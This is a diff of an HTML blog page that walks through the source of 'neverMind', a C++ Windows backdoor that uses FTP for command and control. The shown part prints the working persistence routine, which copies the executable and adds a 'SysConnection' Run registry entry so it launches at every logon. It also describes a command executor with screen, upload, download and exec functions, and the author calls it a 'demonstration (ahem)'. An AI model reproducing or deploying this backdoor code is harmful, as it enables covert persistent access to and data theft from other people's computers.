-<li><code>add_to_reg()</code>: this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command <code>reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \&quot;&quot; + dest + &quot;\&quot;</code> adds a new entry <code>SysConnection</code> to the <code>Run</code> key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.</li>
-</ul>
+</span></span></code></pre></div><p><code>add_to_reg()</code>: this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command <code>reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \&quot;&quot; + dest + &quot;\&quot;</code> adds a new entry <code>SysConnection</code> to the <code>Run</code> key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> neverMind<span style="color:#f92672">::</span>add_to_reg()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        WCHAR path[MAX_PATH];
@@ -428,9 +363,7 @@
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>copy_file(new_path, dest);
 </span></span><span style="display:flex;"><span>        system(std<span style="color:#f92672">::</span>string(<span style="color:#e6db74">&#34;reg add HKCU</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Software</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">CurrentVersion</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Run /v SysConnection /t REG_SZ /d </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> dest <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>).c_str());
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>compile(const std::string &amp;file_path)</code>: this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.</li>
-</ul>
+</span></span></code></pre></div><p><code>compile(const std::string &amp;file_path)</code>: this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> neverMind<span style="color:#f92672">::</span>compile(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string <span style="color:#f92672">&amp;</span>file_path)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>string code <span style="color:#f92672">=</span> wrapper<span style="color:#f92672">::</span>read_file(file_path);
@@ -452,9 +385,7 @@
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>execute(const std::vector&lt;std::string&gt;&amp; spl_line)</code>: this function executes the provided commands. it supports several commands like <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>. each command performs a specific operation and writes the result to the output file.</li>
-</ul>
+</span></span></code></pre></div><p><code>execute(const std::vector&lt;std::string&gt;&amp; spl_line)</code>: this function executes the provided commands. it supports several commands like <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>. each command performs a specific operation and writes the result to the output file.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> neverMind<span style="color:#f92672">::</span>execute(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>string<span style="color:#f92672">&gt;&amp;</span> spl_line)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
@@ -545,20 +476,10 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><ul>
-<li>
-<p><code>HINSTANCE hInstance</code>: a handle to the current instance of the application.</p>
-</li>
-<li>
+</span></span></code></pre></div><p><code>HINSTANCE hInstance</code>: a handle to the current instance of the application.</p>
 <p><code>HINSTANCE hPrevInstance</code>: a handle to the previous instance of the application. this parameter is always NULL in modern Windows applications.</p>
-</li>
-<li>
 <p><code>PWSTR szCmdLine</code>: a pointer to a null-terminated string specifying the command line for the application, excluding the program name.</p>
-</li>
-<li>
 <p><code>int CmdShow</code>: controls how the window is to be shown. this parameter can be one of the following values: <code>SW_HIDE</code>, <code>SW_MAXIMIZE</code>, <code>SW_MINIMIZE</code>, <code>SW_RESTORE</code>, <code>SW_SHOW</code>, <code>SW_SHOWDEFAULT</code>, <code>SW_SHOWMAXIMIZED</code>, <code>SW_SHOWMINIMIZED</code>, <code>SW_SHOWMINNOACTIVE</code>, <code>SW_SHOWNA</code>, <code>SW_SHOWNOACTIVATE</code>, <code>SW_SHOWNORMAL</code>.</p>
-</li>
-</ul>
 <h2 id="conclusion">conclusion</h2>
 <p><code>neverMind</code> is a demonstration (ahem) of a backdoor application that uses FTP for C2 (command + control) operations. it&rsquo;s written in C++ and uses the Windows API and WinINet API for network operations. the program has 3 main components: the <code>ftpC</code> class, the <code>neverMind</code> class, and the <code>main.cpp</code> file.</p>
 <p><code>ftpC</code> provides a set of functions for FTP operations, including connecting to an FTP server, uploading/downloading files, and creating/switching directories. it uses the WinINet API, which is a high-level API for working with FTP, HTTP, and Gopher protocols.</p>
@@ -570,11 +491,14 @@
 
         </div>
     </article>
+    <div id="bottom-back-button-placeholder"></div>
 </div>
 
+        </div>
+    </div>
     
-     <script src="/p5/p5.min.js"></script>
-     <script src="/js/genart.js"></script>
-     <script src="/js/main.js"></script>
+    <script src="/p5/p5.min.js"></script>
+    <script src="/js/genart.js"></script>
+    <script src="/js/main.js"></script>
 </body>
 </html>
